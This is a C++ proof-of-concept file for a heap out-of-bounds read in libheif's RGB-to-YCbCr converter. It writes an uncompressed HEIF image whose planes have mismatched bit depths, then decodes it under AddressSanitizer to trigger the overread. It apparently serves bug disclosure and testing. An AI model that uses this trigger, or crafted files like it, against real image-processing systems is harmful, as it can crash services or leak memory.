// Heap OOB read PoC for Op_RGB_to_YCbCr::convert_colorspace
// (libheif/color-conversion/rgb2yuv.cc).
//
// Writes a planar RGB "unci" (ISO/IEC 23001-17 uncompressed) HEIF image whose
// R/G channels are 10 bits per sample and whose B channel is 8 bits per
// sample, then reads it back through the public heif_decode_image() API
// requesting a YCbCr output. The library has to run the RGB->YCbCr color
// converter, which assumes all three channels share one stride and reads
// past the undersized B plane.
//
// Build (against an ASan-instrumented libheif build):
//   c++ -std=c++17 -g -O1 -fsanitize=address residual.cc -I<repo>/libheif/api \
//       -L<build>/libheif -lheif -o residual
// Run:
//   LD_LIBRARY_PATH=<build>/libheif ./residual /tmp/out.heif

#include <libheif/heif.h>
#include <libheif/heif_uncompressed.h>

#include <cstdio>
#include <cstdlib>

static void check(heif_error err, const char* what)
{
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "%s failed: %s\n", what, err.message);
    exit(1);
  }
}

int main(int argc, char** argv)
{
  const char* path = argc > 1 ? argv[1] : "/tmp/residual.heif";

  const int W = 100, H = 100;

  // --- 1. Build a planar RGB image with mismatched per-channel bit depths.

  heif_image* image = nullptr;
  check(heif_image_create(W, H, heif_colorspace_RGB, heif_chroma_444, &image), "heif_image_create");

  check(heif_image_add_plane(image, heif_channel_R, W, H, 10), "add_plane R");
  check(heif_image_add_plane(image, heif_channel_G, W, H, 10), "add_plane G");
  check(heif_image_add_plane(image, heif_channel_B, W, H, 8), "add_plane B");

  // --- 2. Encode as an uncompressed ('unci') item and write it to a file.

  if (!heif_have_encoder_for_format(heif_compression_uncompressed)) {
    fprintf(stderr, "uncompressed codec not available in this build\n");
    return 1;
  }

  heif_context* enc_ctx = heif_context_alloc();

  heif_encoder* encoder = nullptr;
  check(heif_context_get_encoder_for_format(enc_ctx, heif_compression_uncompressed, &encoder),
       "get_encoder_for_format");

  heif_encoding_options* enc_options = heif_encoding_options_alloc();
  check(heif_context_encode_image(enc_ctx, image, encoder, enc_options, nullptr), "encode_image");
  heif_encoding_options_free(enc_options);

  check(heif_context_write_to_file(enc_ctx, path), "write_to_file");

  heif_encoder_release(encoder);
  heif_image_release(image);
  heif_context_free(enc_ctx);

  // --- 3. Read the file back and decode it while requesting a YCbCr output.
  //        This forces libheif's internal RGB->YCbCr color converter to run
  //        over the mismatched-bit-depth planes we just stored.

  heif_context* dec_ctx = heif_context_alloc();
  check(heif_context_read_from_file(dec_ctx, path, nullptr), "read_from_file");

  heif_image_handle* handle = nullptr;
  check(heif_context_get_primary_image_handle(dec_ctx, &handle), "get_primary_image_handle");

  heif_image* decoded = nullptr;
  heif_error err = heif_decode_image(handle, &decoded, heif_colorspace_YCbCr, heif_chroma_420, nullptr);
  if (err.code != heif_error_Ok) {
    fprintf(stderr, "heif_decode_image: %s\n", err.message);
  }
  else {
    printf("decoded ok (no crash)\n");
    heif_image_release(decoded);
  }

  heif_image_handle_release(handle);
  heif_context_free(dec_ctx);

  return 0;
}
